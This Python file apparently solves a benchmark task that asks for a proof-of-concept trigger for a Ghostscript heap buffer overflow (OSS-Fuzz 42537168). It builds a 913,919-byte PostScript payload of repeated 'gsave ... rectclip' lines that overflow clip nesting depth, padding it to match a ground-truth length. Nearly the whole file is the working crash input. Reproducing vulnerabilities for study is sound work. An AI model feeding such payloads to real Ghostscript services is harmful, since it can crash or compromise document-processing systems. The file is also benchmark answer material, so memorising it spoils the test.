import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: Ghostscript Heap Buffer Overflow (OSS-Fuzz 42537168)
        """
        # The vulnerability is described as unchecked nesting depth before pushing a clip mark.
        # This occurs in Ghostscript when processing PostScript/PDF files with excessive
        # clip path nesting. The ground truth length (~913KB) suggests a high recursion depth.
        
        # We construct a PostScript file that repeatedly saves the graphics state (gsave)
        # and applies a clipping rectangle (rectclip), increasing the stack depth.
        
        target_length = 913919
        header = b"%!PS\n"
        # "gsave" pushes the current graphics state (increasing nesting depth).
        # "rectclip" modifies the clip path (involving clip marks).
        pattern = b"gsave 0 0 1 1 rectclip\n"
        
        # Calculate repetitions to approximate the ground truth length
        pattern_len = len(pattern)
        header_len = len(header)
        
        # We want to be as close to the target length as possible to ensure sufficient depth
        repeats = (target_length - header_len) // pattern_len
        
        payload = header + pattern * repeats
        
        # Pad with spaces (ignored by PostScript) to match exact length
        # This ensures we match the specific properties of the ground truth if length correlates to depth
        remaining = target_length - len(payload)
        if remaining > 0:
            payload += b" " * remaining
            
        return payload